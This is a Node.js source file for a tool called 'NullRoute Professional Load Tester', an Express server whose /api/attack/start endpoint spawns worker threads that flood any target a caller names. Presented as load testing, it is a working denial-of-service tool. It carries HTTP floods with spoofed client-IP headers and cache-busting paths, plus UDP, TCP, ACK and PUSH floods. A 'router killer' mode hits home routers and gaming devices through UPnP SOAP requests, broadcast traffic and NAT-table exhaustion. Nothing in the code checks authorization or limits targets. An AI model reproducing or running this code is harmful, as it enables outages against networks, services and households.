const express = require('express');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');
const dgram = require('dgram');
const net = require('net');
const crypto = require('crypto');
const os = require('os');
const dns = require('dns');

// ==========================================
// MAIN THREAD LOGIC
// ==========================================
if (isMainThread) {
    const app = express();
    const port = 3000;

    // Serve static files
    app.use(express.static(__dirname));
    app.use(express.json());

    // CORS
    app.use((req, res, next) => {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
        next();
    });

    // State
    let workers = [];
    let aggregatedStats = {
        rps: 0,
        bps: 0, // Bytes per second
        activeVUs: 0,
        errors: 0,
        latencies: [], // Sampled latencies for P95 calculation
        statusCodes: {}
    };

    // Helper: Reset aggregated stats periodically
    setInterval(() => {
        if (aggregatedStats.latencies.length > 0) {
            aggregatedStats.latencies.sort((a, b) => a - b);
            const p95 = aggregatedStats.latencies[Math.floor(aggregatedStats.latencies.length * 0.95)];
            const p99 = aggregatedStats.latencies[Math.floor(aggregatedStats.latencies.length * 0.99)];
            const avg = aggregatedStats.latencies.reduce((a, b) => a + b, 0) / aggregatedStats.latencies.length;
            
            if (workers.length > 0) {
                console.log(`[STATS] RPS: ${aggregatedStats.rps} | Bandwidth: ${(aggregatedStats.bps / 1024 / 1024).toFixed(2)} MB/s | Active VUs: ${aggregatedStats.activeVUs}`);
                console.log(`[LATENCY] Avg: ${avg.toFixed(2)}ms | P95: ${p95}ms | P99: ${p99}ms`);
            }
        } else if (workers.length > 0) {
            console.log(`[STATS] RPS: ${aggregatedStats.rps} | Bandwidth: ${(aggregatedStats.bps / 1024 / 1024).toFixed(2)} MB/s | Active VUs: ${aggregatedStats.activeVUs}`);
        }

        // Reset for next window
        aggregatedStats.rps = 0;
        aggregatedStats.bps = 0;
        aggregatedStats.errors = 0;
        aggregatedStats.latencies = [];
        aggregatedStats.statusCodes = {};
    }, 1000);

    // API Routes
    app.get('/api/health', (req, res) => res.json({ status: 'online', version: '3.1.0-ULTRA' }));

    app.post('/api/attack/start', (req, res) => {
        const { type, target, port, duration, method, threads } = req.body;
        
        if (workers.length > 0) {
            return res.status(400).json({ error: 'Test already running' });
        }

        console.log(`[LOAD TEST] Initializing ${type.toUpperCase()} scenario against ${target}:${port}`);
        
        // Calculate Worker Distribution
        const cpuCount = os.cpus().length;
        // Use requested threads as Total VUs, default to 100 if missing
        const totalVUs = parseInt(threads) || 100; 
        const vusPerWorker = Math.ceil(totalVUs / cpuCount);

        console.log(`[SYSTEM] Spawning ${cpuCount} worker threads with ~${vusPerWorker} VUs each (Total: ${totalVUs})`);

        for (let i = 0; i < cpuCount; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    type,
                    target,
                    port,
                    duration,
                    method,
                    vus: vusPerWorker
                }
            });

            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    aggregatedStats.rps += msg.data.rps;
                    aggregatedStats.bps += msg.data.bps;
                    aggregatedStats.errors += msg.data.errors;
                    aggregatedStats.activeVUs = workers.length * vusPerWorker; // Approximation
                    
                    // Merge latencies (sampling to avoid memory overflow)
                    if (msg.data.latencies) {
                        // Take top 100 samples from each worker
                        aggregatedStats.latencies.push(...msg.data.latencies.slice(0, 100));
                    }

                    // Merge status codes
                    for (const [code, count] of Object.entries(msg.data.statusCodes)) {
                        aggregatedStats.statusCodes[code] = (aggregatedStats.statusCodes[code] || 0) + count;
                    }
                } else if (msg.type === 'done') {
                    // Worker finished
                }
            });

            worker.on('error', console.error);
            worker.on('exit', (code) => {
                workers = workers.filter(w => w !== worker);
                if (workers.length === 0) {
                    console.log('[LOAD TEST] All workers finished.');
                }
            });

            workers.push(worker);
        }

        res.json({ success: true, message: 'Load test started', workers: cpuCount });
    });

    app.post('/api/attack/stop', (req, res) => {
        console.log('[LOAD TEST] Stopping all workers...');
        workers.forEach(w => w.terminate());
        workers = [];
        res.json({ success: true, message: 'Load test stopped' });
    });

    app.get('/api/status', (req, res) => {
        res.json({ 
            active: workers.length > 0, 
            workers: workers.length,
            stats: {
                rps: aggregatedStats.rps,
                bandwidth_mbps: (aggregatedStats.bps / 1024 / 1024).toFixed(2),
                errors: aggregatedStats.errors
            }
        });
    });

    app.listen(port, () => {
        console.log(`NullRoute Professional Load Tester v3.1.0-ULTRA running on port ${port}`);
        console.log(`[SYSTEM] Detected ${os.cpus().length} CPU Cores available for load generation.`);
    });

} 

// ==========================================
// WORKER THREAD LOGIC
// ==========================================
else {
    // Stats buffer
    let stats = {
        rps: 0,
        bps: 0,
        errors: 0,
        latencies: [],
        statusCodes: {}
    };

    // Report to main thread every 1s
    setInterval(() => {
        parentPort.postMessage({ type: 'stats', data: stats });
        // Reset local stats
        stats = {
            rps: 0,
            bps: 0,
            errors: 0,
            latencies: [], // Clear array
            statusCodes: {}
        };
    }, 1000);

    const { type, target, port, duration, method, vus } = workerData;
    let isRunning = true;

    // Auto-stop
    setTimeout(() => {
        isRunning = false;
        parentPort.postMessage({ type: 'done' });
        process.exit(0);
    }, duration * 1000);

    // ==========================================
    // SHARED RESOURCES (High Performance)
    // ==========================================
    
    // 1. Massive Random Buffer for Payloads (10MB)
    // Avoids generating random bytes per packet
    const SHARED_BUFFER_SIZE = 10 * 1024 * 1024; // 10MB
    const sharedBuffer = Buffer.allocUnsafe(SHARED_BUFFER_SIZE);
    crypto.randomFillSync(sharedBuffer);

    // Helper: Get random slice from buffer
    function getRandomPayload(size) {
        // Ensure we don't go out of bounds
        const maxOffset = SHARED_BUFFER_SIZE - size;
        const offset = Math.floor(Math.random() * maxOffset);
        return sharedBuffer.slice(offset, offset + size);
    }

    // 2. Real User Agents
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0"
    ];

    // 3. Real Referers
    const referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.instagram.com/",
        "https://www.youtube.com/",
        "https://www.reddit.com/"
    ];

    function generateRandomIP() {
        return Math.floor(Math.random() * 255) + '.' + 
               Math.floor(Math.random() * 255) + '.' + 
               Math.floor(Math.random() * 255) + '.' + 
               Math.floor(Math.random() * 255);
    }

    function getTargetPort() {
        if (port === 'mix') {
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5900, 8080, 8443];
            return commonPorts[Math.floor(Math.random() * commonPorts.length)];
        } else if (port === 'all') {
            return Math.floor(Math.random() * 65535) + 1;
        } else if (typeof port === 'string' && port.includes(',')) {
            const ports = port.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
            return ports[Math.floor(Math.random() * ports.length)];
        }
        return parseInt(port);
    }

    // ------------------------------------------
    // SCENARIO: HTTP/HTTPS VIRTUAL USER
    // ------------------------------------------
    async function runHttpVU() {
        // Use type to determine protocol, but respect port if it strongly suggests otherwise?
        // Actually, stick to the requested type (http or https) to avoid protocol mismatch errors.
        const lib = type === 'https' ? https : http;
        
        // Advanced Agent Configuration
        const agent = new lib.Agent({
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: Infinity, // Allow unlimited connections per VU
            rejectUnauthorized: false, // Bypass SSL errors
            scheduling: 'fifo'
        });

        while (isRunning) {
            const start = process.hrtime();
            
            try {
                const effectiveMethod = method === 'MIX' ? (Math.random() > 0.5 ? 'GET' : 'POST') : (method || 'GET');
                const currentPort = getTargetPort();
                
                // Construct "Real" looking request
                const path = '/' + Math.random().toString(36).substring(7); // Random path to bypass cache
                const spoofedIP = generateRandomIP();
                
                const options = {
                    hostname: target,
                    port: currentPort,
                    path: path,
                    method: effectiveMethod,
                    headers: {
                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                        'Referer': referers[Math.floor(Math.random() * referers.length)],
                        'X-Forwarded-For': spoofedIP,
                        'Client-IP': spoofedIP,
                        'X-Real-IP': spoofedIP,
                        'X-Client-IP': spoofedIP,
                        'X-Remote-IP': spoofedIP,
                        'True-Client-IP': spoofedIP,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'cross-site',
                        'Sec-Fetch-User': '?1'
                    },
                    agent: agent,
                    timeout: 5000
                };

                const req = lib.request(options, (res) => {
                    let bytes = 0;
                    res.on('data', (chunk) => { bytes += chunk.length; });
                    res.on('end', () => {
                        const end = process.hrtime(start);
                        const latencyMs = (end[0] * 1000 + end[1] / 1e6);
                        
                        stats.rps++;
                        stats.bps += bytes;
                        stats.latencies.push(latencyMs);
                        stats.statusCodes[res.statusCode] = (stats.statusCodes[res.statusCode] || 0) + 1;
                    });
                });

                req.on('error', (e) => {
                    stats.errors++;
                });

                // Send Random Payload for POST/PUT
                if (effectiveMethod === 'POST' || effectiveMethod === 'PUT') {
                    const payloadSize = Math.floor(Math.random() * 1024) + 64; // Random size 64B - 1KB
                    const payload = getRandomPayload(payloadSize);
                    req.write(payload);
                    stats.bps += payload.length;
                }
                
                req.end();

                // Adaptive delay: High RPS needs minimal delay, but yielding prevents event loop starvation
                await new Promise(r => setImmediate(r));

            } catch (e) {
                stats.errors++;
            }
        }
    }

    // ------------------------------------------
    // SCENARIO: UDP VIRTUAL USER
    // ------------------------------------------
    async function runUdpVU() {
        let socket = dgram.createSocket('udp4');
        let packetCount = 0;
        
        // Helper to rotate socket (Change Source Port)
        const rotateSocket = () => {
            try { socket.close(); } catch(e) {}
            socket = dgram.createSocket('udp4');
            // Handle async errors on the socket
            socket.on('error', () => { stats.errors++; });
        };

        while (isRunning) {
            // Random packet size (64B to 1400B - standard MTU safe)
            const size = Math.floor(Math.random() * 1336) + 64;
            const payload = getRandomPayload(size);
            
            // Burst Send (Batching for Performance)
            // Sending 10-20 packets per tick significantly increases PPS
            for (let i = 0; i < 20; i++) {
                socket.send(payload, 0, payload.length, getTargetPort(), target, (err) => {
                    if (err) stats.errors++;
                    else {
                        stats.rps++;
                        stats.bps += payload.length;
                    }
                });
            }
            
            packetCount += 20;
            
            // Rotate socket every ~5000 packets to simulate different source ports / sessions
            if (packetCount > 5000) {
                rotateSocket();
                packetCount = 0;
            }
            
            await new Promise(r => setImmediate(r));
        }
        
        try { socket.close(); } catch(e) {}
    }

    // ------------------------------------------
    // SCENARIO: TCP VIRTUAL USER
    // ------------------------------------------
    async function runTcpVU() {
        while (isRunning) {
            const start = process.hrtime();
            const socket = new net.Socket();
            
            socket.setTimeout(2000);
            
            // Randomize source port implicitly by new socket creation
            socket.connect(getTargetPort(), target, () => {
                const end = process.hrtime(start);
                const latencyMs = (end[0] * 1000 + end[1] / 1e6);
                
                stats.rps++;
                stats.latencies.push(latencyMs);
                
                // Send garbage to simulate handshake completion + data
                const payloadSize = Math.floor(Math.random() * 2048) + 64;
                const payload = getRandomPayload(payloadSize);
                
                socket.write(payload);
                stats.bps += payload.length;
                
                socket.destroy(); // Close immediately after sending (syn-flood style behavior)
            });

            socket.on('error', () => {
                stats.errors++;
                socket.destroy();
            });
            
            socket.on('timeout', () => {
                stats.errors++;
                socket.destroy();
            });

            // Wait for connection to close or error before next iteration
            await new Promise(resolve => {
                socket.on('close', resolve);
                socket.on('error', resolve); // Fallback
            });
        }
    }

    // ------------------------------------------
    // SCENARIO: ACK VIRTUAL USER
    // ------------------------------------------
    async function runAckVU() {
        while (isRunning) {
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            // Connect and keep sending small packets to force ACKs
            const ackPayload = Buffer.from([0x00]); // Pre-allocate 1 byte
            socket.connect(getTargetPort(), target, () => {
                stats.rps++; // Connection established
                
                // Send 1-byte keep-alive packets rapidly
                const keepAlive = setInterval(() => {
                    if (!socket.writable || !isRunning) {
                        clearInterval(keepAlive);
                        socket.destroy();
                        return;
                    }
                    socket.write(ackPayload);
                    stats.bps += 1;
                    stats.rps++; // Count each ACK-triggering packet as a request
                }, 10); // Very fast interval
                
                socket.on('close', () => clearInterval(keepAlive));
                socket.on('error', () => clearInterval(keepAlive));
            });

            socket.on('error', () => {
                stats.errors++;
                socket.destroy();
            });

            // Wait for connection to close or error before next iteration
            await new Promise(resolve => {
                socket.on('close', resolve);
                socket.on('error', resolve); 
            });
        }
    }

    // ------------------------------------------
    // SCENARIO: ACK & PUSH VIRTUAL USER
    // ------------------------------------------
    async function runAckPushVU() {
        while (isRunning) {
            const socket = new net.Socket();
            socket.setTimeout(5000);
            
            // Connect and flood with data
            socket.connect(getTargetPort(), target, () => {
                stats.rps++;
                
                // Continuous writing (PUSH flag set on data)
                const pushFlood = setInterval(() => {
                    if (!socket.writable || !isRunning) {
                        clearInterval(pushFlood);
                        socket.destroy();
                        return;
                    }
                    const size = Math.floor(Math.random() * 4096) + 1024; // 1KB-5KB
                    const payload = getRandomPayload(size);
                    socket.write(payload);
                    stats.bps += size;
                    stats.rps++;
                }, 5); // Extremely aggressive
                
                socket.on('close', () => clearInterval(pushFlood));
                socket.on('error', () => clearInterval(pushFlood));
            });

            socket.on('error', () => {
                stats.errors++;
                socket.destroy();
            });

            await new Promise(resolve => {
                socket.on('close', resolve);
                socket.on('error', resolve); 
            });
        }
    }

    // ------------------------------------------
    // SCENARIO: ROUTER KILLER VIRTUAL USER
    // ------------------------------------------
    async function runRouterKillerVU() {
        // High-frequency, mixed-method flood designed to overwhelm consumer routers
        // UPDATED: Now includes SMART SERVICE TARGETING to hit internal devices (Xbox, IoT, PC) via UPnP ports
        
        // Target specific high-value ports often forwarded by UPnP or Default
        const SMART_PORTS = [
            3074, 53, 80, 443, 88, 500, 3544, 4500, // Xbox Live / IPsec
            9308, 3478, 3479, // PlayStation Network
            3389, 5900, // RDP / VNC (Remote Access)
            21, 22, 23, // FTP, SSH, Telnet (Router Management/IoT)
            32400, 8080, 8443, // Plex / Alt Web
            5060, 5061, // VoIP (SIP)
            25565, 27015 // Minecraft / Steam
        ];

        // Pre-allocate SSDP Search Packet (Multicast to 239.255.255.250:1900)
        const ssdpPayload = Buffer.from(
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 1\r\n' +
            'ST: ssdp:all\r\n\r\n'
        );

        // Pre-allocate DHCP Discover (Broadcast to 255.255.255.255:67)
        const dhcpPayload = Buffer.alloc(240);
        dhcpPayload.writeUInt8(1, 0); // BootRequest
        dhcpPayload.writeUInt8(1, 1); // Ethernet
        dhcpPayload.writeUInt8(6, 2); // MAC Length
        dhcpPayload.writeUInt32BE(0x63825363, 236); // Magic Cookie

        // Pre-allocate commonly used payloads
        const medPayload = getRandomPayload(1400);
        const bigPayload = getRandomPayload(1450);

        // Pre-allocate UPnP SOAP Payload (Heavy XML Parsing) - Targets TCP 5000/2869
        const soapPayload = Buffer.from(
            'POST /ctl/IPConn HTTP/1.1\r\n' +
            'HOST: ' + target + ':5000\r\n' +
            'SOAPACTION: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"\r\n' +
            'CONTENT-TYPE: text/xml; charset="utf-8"\r\n' +
            'CONTENT-LENGTH: 650\r\n\r\n' +
            '<?xml version="1.0"?>' +
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">' +
            '<s:Body>' +
            '<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">' +
            '<NewRemoteHost></NewRemoteHost>' +
            '<NewExternalPort>474</NewExternalPort>' +
            '<NewProtocol>TCP</NewProtocol>' +
            '<NewInternalPort>474</NewInternalPort>' +
            '<NewInternalClient>192.168.1.100</NewInternalClient>' +
            '<NewEnabled>1</NewEnabled>' +
            '<NewPortMappingDescription>Xbox</NewPortMappingDescription>' +
            '<NewLeaseDuration>0</NewLeaseDuration>' +
            '</u:AddPortMapping>' +
            '</s:Body>' +
            '</s:Envelope>'
        );

        // Pre-allocate IKEv2 (VPN Passthrough) Payload - UDP 500/4500
        // Forces Router to check NAT-T state even if UPnP is OFF
        const ikePayload = Buffer.alloc(100); 
        ikePayload.fill(0);
        ikePayload.writeUInt32BE(0x12345678, 0); // SPI Initiator
        ikePayload.writeUInt8(34, 16); // Exchange Type: IKE_SA_INIT (Heavy processing)
        
        // Pre-allocate DNS Query Payload - UDP 53
        // Forces Router DNS Proxy/Relay to process packet
        const dnsPayload = Buffer.alloc(32);
        dnsPayload.writeUInt16BE(0x1337, 0); // ID
        dnsPayload.writeUInt16BE(0x0100, 2); // Recursion Desired
        
        // Create ONE reused socket for all UDP operations
        const udpSocket = dgram.createSocket('udp4');
        udpSocket.on('error', () => {}); // Ignore errors
        
        // Enable broadcast once bound (handled implicitly by send, but explicit bind helps)
        try {
            udpSocket.bind(() => {
                try { udpSocket.setBroadcast(true); } catch(e){}
            });
        } catch(e) {}

        while (isRunning) {
            const mode = Math.random();
            
            // ---------------------------------------------------------
            // VECTOR 1: UPnP & BROADCAST (15%) - "The Loud Noise"
            // ---------------------------------------------------------
            if (mode < 0.15) {
                // Burst 15 packets
                for(let i=0; i<15; i++) {
                    // 1. SSDP Multicast (UPnP Discovery)
                    udpSocket.send(ssdpPayload, 0, ssdpPayload.length, 1900, "239.255.255.250", (err) => {
                        if (!err) { stats.rps++; stats.bps += ssdpPayload.length; }
                    });
                    
                    // 2. DHCP Broadcast (Force Router CPU to wake up)
                    udpSocket.send(dhcpPayload, 0, dhcpPayload.length, 67, "255.255.255.255", (err) => {
                         if (!err) { stats.rps++; stats.bps += dhcpPayload.length; }
                    });
                }
                // PULSE: Wait 5ms
                await new Promise(r => setTimeout(r, 5));
            }
            // ---------------------------------------------------------
            // VECTOR 2: UNIVERSAL PASSTHROUGH (25%) - "The Bypass"
            // Works even if UPnP is DISABLED (VPN/DNS Helpers)
            // ---------------------------------------------------------
            else if (mode < 0.40) {
                 for(let i=0; i<20; i++) {
                    // IKEv2/IPSec (UDP 500/4500) - Heavy Kernel Processing
                    udpSocket.send(ikePayload, 0, ikePayload.length, 500, target, () => {});
                    udpSocket.send(ikePayload, 0, ikePayload.length, 4500, target, () => {});
                    
                    // DNS Query (UDP 53) - Hits Router DNS Relay
                    udpSocket.send(dnsPayload, 0, dnsPayload.length, 53, target, () => {});
                    
                    stats.rps += 3;
                    stats.bps += (ikePayload.length * 2) + dnsPayload.length;
                 }
                 // PULSE: Wait 3ms
                 await new Promise(r => setTimeout(r, 3));
            }
            // ---------------------------------------------------------
            // VECTOR 3: SMART SERVICE TARGETING (30%) - "The Surgeon"
            // Hits common forwarded ports (Xbox, RDP, Web)
            // ---------------------------------------------------------
            else if (mode < 0.70) {
                // Pick a random smart port
                const smartPort = SMART_PORTS[Math.floor(Math.random() * SMART_PORTS.length)];
                
                // Burst 15 packets at this specific service
                for(let i=0; i<15; i++) {
                    udpSocket.send(medPayload, 0, medPayload.length, smartPort, target, (err) => {
                        if (!err) { stats.rps++; stats.bps += medPayload.length; }
                    });
                }
                // PULSE: Wait 2ms
                await new Promise(r => setTimeout(r, 2));
            } 
            // ---------------------------------------------------------
            // VECTOR 4: UPnP SOAP/XML FLOOD (15%) - "The Exploit"
            // Only works if UPnP is ON (TCP 5000/2869)
            // ---------------------------------------------------------
            else if (mode < 0.85) {
                 const socket = new net.Socket();
                 socket.setTimeout(2000);
                 const upnpPort = Math.random() < 0.5 ? 5000 : 2869; // Common UPnP Ports

                 socket.connect(upnpPort, target, () => {
                     stats.rps++;
                     // Send Malformed SOAP to force XML Parsing (High CPU)
                     socket.write(soapPayload);
                     // Keep open briefly to force processing
                     setTimeout(() => { try { socket.destroy(); } catch(e){} }, 100);
                 });

                 socket.on('error', () => {
                     // If connection fails (port closed), it still counts as an attempt
                     stats.errors++;
                     socket.destroy();
                 });

                 // PULSE: Wait 5ms (TCP Connect is heavy)
                 await new Promise(r => setTimeout(r, 5));
            }
            // ---------------------------------------------------------
            // VECTOR 5: NAT TABLE EXHAUSTION (15%) - "The Brute"
            // Random High Ports -> Force Router to track connections
            // ---------------------------------------------------------
            else {
                // Burst 20 packets to random high ports
                for(let i=0; i<20; i++) {
                     const randomPort = Math.floor(Math.random() * 60000) + 5000;
                     udpSocket.send(bigPayload, 0, bigPayload.length, randomPort, target, (err) => {
                        if (!err) { stats.rps++; stats.bps += bigPayload.length; }
                    });
                }
                
                // PULSE: Wait 2ms
                await new Promise(r => setTimeout(r, 2));
            }
        }
        
        // Cleanup when stopping
        try { udpSocket.close(); } catch(e){}
    }

    // ------------------------------------------
    // MAIN LOGIC
    // ------------------------------------------
    if (type === 'udp') {
        for (let i = 0; i < vus; i++) runUdpVU();
    } else if (type === 'http' || type === 'https') {
        for (let i = 0; i < vus; i++) runHttpVU();
    } else if (type === 'tcp') {
        for (let i = 0; i < vus; i++) runTcpVU();
    } else if (type === 'ack') {
        for (let i = 0; i < vus; i++) runAckVU();
    } else if (type === 'ack_push') {
        for (let i = 0; i < vus; i++) runAckPushVU();
    } else if (type === 'router_killer') {
        for (let i = 0; i < vus; i++) runRouterKillerVU();
    }
}
